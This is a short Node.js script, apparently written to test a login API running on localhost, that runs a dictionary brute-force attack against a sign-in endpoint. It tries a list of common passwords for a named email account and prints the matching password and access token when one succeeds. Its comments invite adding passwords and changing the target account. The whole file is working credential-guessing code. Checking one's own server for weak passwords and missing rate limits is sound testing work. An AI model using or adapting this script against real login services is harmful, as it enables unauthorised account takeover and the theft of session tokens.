const axios = require('axios');
const baseURL = 'http://localhost:3001/v1/auth'; // Adjust this URL to match your server's configuration

async function bruteForce(email) {
    const passwords = ['password', '123456', '12345678', 'qwerty', 'abc123', 'abc10', 'admin']; // Add more passwords as needed
    console.log(`Starting brute force attack for: ${email}`);

    for (let password of passwords) {
        // console.log(`Trying password: ${password} for email: ${email}`);
        try {
            const response = await axios.post(`${baseURL}/signin`, {
                email,
                password
            });

            if (response.data && response.data.content.meta.access_token) {
                console.log(`Success! Email: ${email}, Password: ${password}`);
                console.log(`Token: ${response.data.content.meta.access_token}`);
                break; // Stop the loop if the correct password is found
            }
        } catch (error) {
            if (error.response && error.response.data.message === 'Invalid credentials') {
                console.log(`Failed attempt with password: ${password}`);
            } else {
                // Handle other types of errors like network errors or server errors
                console.log(`Error: ${error.message}`);
            }
        }
    }
}

bruteForce('abc10@watchguard.com'); // Change the email to target different accounts
